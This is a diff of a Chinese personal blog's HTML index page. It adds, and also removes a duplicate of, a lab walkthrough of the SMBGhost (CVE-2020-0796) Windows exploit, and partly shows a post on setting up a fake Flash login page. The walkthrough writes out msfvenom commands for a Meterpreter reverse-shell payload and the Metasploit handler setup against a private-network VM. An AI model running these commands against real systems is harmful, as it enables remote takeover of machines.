@@ -146,6 +146,68 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ljyqy">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LjyCqy">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/07/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">永恒之黑漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-07-11 20:04:06 / 修改时间：20:04:18" itemprop="dateCreated datePublished" datetime="2024-07-11T20:04:06+08:00">2024-07-11</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>1.下载永恒之黑漏洞的压缩包，解压后加入到kali中<br>2.查询kali以及win10hei的ip地址<br>  利用ifconfig和ipconfig查询<br>  kali的ip地址为192.168.131.131<br>  win10hei的ip地址为192.168.131.130<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521948912-cc612adf-3991-4d46-97c6-7fb41a8c8c6c.png#averageHue=%23383a43&clientId=ue980ce7e-b6e9-4&from=paste&height=300&id=ud0727a84&originHeight=450&originWidth=710&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1280601&status=done&style=none&taskId=u62a51c11-a5a0-4382-839b-b8599b4fbb1&title=&width=473.3333333333333" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521951486-932c9ac1-f32d-4ea2-9b70-0dd5f6eb4834.png#averageHue=%23141414&clientId=ue980ce7e-b6e9-4&from=paste&height=251&id=u32e29eb6&originHeight=303&originWidth=571&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=693552&status=done&style=none&taskId=u25601603-1251-48ce-aed7-8e750713be2&title=&width=473.66668701171875" alt="image.png"></p>
+<p>3.在kali 中利用  <strong>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.131.131   LPORT&#x3D;5555 -b ‘\x00’ -i 1 -f python &gt; exploit  生成木马</strong><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521956653-28247664-bc66-40ba-9ea9-ded70a1798a9.png#averageHue=%23353740&clientId=ue980ce7e-b6e9-4&from=paste&height=99&id=u12c01978&originHeight=173&originWidth=831&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=576239&status=done&style=none&taskId=u35046773-70e3-42ea-8373-b10c3c6bda9&title=&width=476" alt="image.png"></p>
+<p>4.将 exploit中的内容替换到exploit.py中<br>vim exploit<br>:%s&#x2F;buf&#x2F;USER_PAYLOAD<br>:wq!<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521961551-e6d43f80-12be-4a9d-881d-da5bbf635a0c.png#averageHue=%2333353f&clientId=ue980ce7e-b6e9-4&from=paste&height=54&id=uaca8a733&originHeight=53&originWidth=463&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=98440&status=done&style=none&taskId=uec483e47-1ad4-4d48-af6f-9abe383c2d3&title=&width=475.66668701171875" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720523496376-c8a39c29-a1b1-4977-9d72-c399aad1fe5a.png#averageHue=%2343444d&clientId=ub55bca28-2a98-4&from=paste&height=297&id=u6bc32bbf&originHeight=789&originWidth=565&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=158407&status=done&style=none&taskId=u6ae931ab-4df4-46d8-a301-a88e6338ca1&title=&width=212.66668701171875" alt="image.png">   <img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720523600370-7061976b-45cc-4f4f-a2c1-b3fb26469849.png#averageHue=%23252933&clientId=ub55bca28-2a98-4&from=paste&height=296&id=u315d8e63&originHeight=859&originWidth=611&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=227630&status=done&style=none&taskId=u10b05f0a-dba7-4abb-b740-db05aa3dc60&title=&width=210.33334350585938" alt="image.png"><br>5.利用kali监听<br>msfconsole<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>show options<br>set lhost 192.168.131.131<br>set lport 5555<br>run<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521967636-de8826c5-0364-4342-871e-c0b61eaac609.png#averageHue=%2330313b&clientId=ue980ce7e-b6e9-4&from=paste&height=442&id=ud745f767&originHeight=561&originWidth=603&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1355962&status=done&style=none&taskId=u63dfb1b4-89d7-4f72-8ad9-629c78aaa29&title=&width=475" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521971199-8c989a31-a0f6-4177-9a8e-84d8b3974907.png#averageHue=%2330313c&clientId=ue980ce7e-b6e9-4&from=paste&height=237&id=udbdb70fa&originHeight=396&originWidth=799&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1268134&status=done&style=none&taskId=ue8980744-e61f-4895-a1cb-fbd41e73f27&title=&width=477.66668701171875" alt="image.png"><br>关闭win10hei防火墙，运行exp<br>python  exploit.py -ip 192.168.131.131<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521976384-c241aa4c-acab-42ca-a3ee-f1d3a83a69e7.png#averageHue=%2333353e&clientId=ue980ce7e-b6e9-4&from=paste&height=193&id=u4d92dc05&originHeight=336&originWidth=831&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1119086&status=done&style=none&taskId=uc28da1b1-c6d3-4132-b212-c2ae02128ff&title=&width=478" alt="image.png"></p>
+<p>运气好，几次就运行成功了…….</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/11/Flash%E9%92%93%E9%B1%BC/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -195,68 +257,6 @@
 <p>打开Phpstudy，启动Apache和MySQL，将flash.js和login.php拖入phpstudy目录下的WWW文件夹中</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720696558018-ec2a9817-c84e-4e98-bb7d-6aad203199e2.png#averageHue=%23fcfbfb&id=WrPJq&originHeight=420&originWidth=908&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720696558211-829e2563-f10b-4abb-9fdf-c4fac7ba9516.png#averageHue=%23fcfbfa&id=SlJmp&originHeight=339&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
 <p>浏览器中输入域名127.0.0.1&#x2F;login.php即可访问<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720696558549-76388be2-662d-4dee-8d44-ccce398e4a62.png#averageHue=%2331376b&id=iOQs3&originHeight=1539&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E(CVE-2020-0796)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="ljyqy">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="LjyCqy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/07/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E(CVE-2020-0796)/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-07-11 09:24:44 / 修改时间：09:24:01" itemprop="dateCreated datePublished" datetime="2024-07-11T09:24:44+08:00">2024-07-11</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>1.下载永恒之黑漏洞的压缩包，解压后加入到kali中<br>2.查询kali以及win10hei的ip地址<br>  利用ifconfig和ipconfig查询<br>  kali的ip地址为192.168.131.131<br>  win10hei的ip地址为192.168.131.130<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521948912-cc612adf-3991-4d46-97c6-7fb41a8c8c6c.png#averageHue=%23383a43&clientId=ue980ce7e-b6e9-4&from=paste&height=300&id=ud0727a84&originHeight=450&originWidth=710&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1280601&status=done&style=none&taskId=u62a51c11-a5a0-4382-839b-b8599b4fbb1&title=&width=473.3333333333333" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521951486-932c9ac1-f32d-4ea2-9b70-0dd5f6eb4834.png#averageHue=%23141414&clientId=ue980ce7e-b6e9-4&from=paste&height=251&id=u32e29eb6&originHeight=303&originWidth=571&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=693552&status=done&style=none&taskId=u25601603-1251-48ce-aed7-8e750713be2&title=&width=473.66668701171875" alt="image.png"></p>
-<p>3.在kali 中利用  <strong>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.131.131   LPORT&#x3D;5555 -b ‘\x00’ -i 1 -f python &gt; exploit  生成木马</strong><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521956653-28247664-bc66-40ba-9ea9-ded70a1798a9.png#averageHue=%23353740&clientId=ue980ce7e-b6e9-4&from=paste&height=99&id=u12c01978&originHeight=173&originWidth=831&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=576239&status=done&style=none&taskId=u35046773-70e3-42ea-8373-b10c3c6bda9&title=&width=476" alt="image.png"></p>
-<p>4.将 exploit中的内容替换到exploit.py中<br>vim exploit<br>:%s&#x2F;buf&#x2F;USER_PAYLOAD<br>:wq!<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521961551-e6d43f80-12be-4a9d-881d-da5bbf635a0c.png#averageHue=%2333353f&clientId=ue980ce7e-b6e9-4&from=paste&height=54&id=uaca8a733&originHeight=53&originWidth=463&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=98440&status=done&style=none&taskId=uec483e47-1ad4-4d48-af6f-9abe383c2d3&title=&width=475.66668701171875" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720523496376-c8a39c29-a1b1-4977-9d72-c399aad1fe5a.png#averageHue=%2343444d&clientId=ub55bca28-2a98-4&from=paste&height=297&id=u6bc32bbf&originHeight=789&originWidth=565&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=158407&status=done&style=none&taskId=u6ae931ab-4df4-46d8-a301-a88e6338ca1&title=&width=212.66668701171875" alt="image.png">   <img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720523600370-7061976b-45cc-4f4f-a2c1-b3fb26469849.png#averageHue=%23252933&clientId=ub55bca28-2a98-4&from=paste&height=296&id=u315d8e63&originHeight=859&originWidth=611&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=227630&status=done&style=none&taskId=u10b05f0a-dba7-4abb-b740-db05aa3dc60&title=&width=210.33334350585938" alt="image.png"><br>5.利用kali监听<br>msfconsole<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>show options<br>set lhost 192.168.131.131<br>set lport 5555<br>run<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521967636-de8826c5-0364-4342-871e-c0b61eaac609.png#averageHue=%2330313b&clientId=ue980ce7e-b6e9-4&from=paste&height=442&id=ud745f767&originHeight=561&originWidth=603&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1355962&status=done&style=none&taskId=u63dfb1b4-89d7-4f72-8ad9-629c78aaa29&title=&width=475" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521971199-8c989a31-a0f6-4177-9a8e-84d8b3974907.png#averageHue=%2330313c&clientId=ue980ce7e-b6e9-4&from=paste&height=237&id=udbdb70fa&originHeight=396&originWidth=799&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1268134&status=done&style=none&taskId=ue8980744-e61f-4895-a1cb-fbd41e73f27&title=&width=477.66668701171875" alt="image.png"><br>关闭win10hei防火墙，运行exp<br>python  exploit.py -ip 192.168.131.131<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46296189/1720521976384-c241aa4c-acab-42ca-a3ee-f1d3a83a69e7.png#averageHue=%2333353e&clientId=ue980ce7e-b6e9-4&from=paste&height=193&id=u4d92dc05&originHeight=336&originWidth=831&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1119086&status=done&style=none&taskId=uc28da1b1-c6d3-4132-b212-c2ae02128ff&title=&width=478" alt="image.png"></p>
-<p>运气好，几次就运行成功了…….</p>
 
       
     </div>
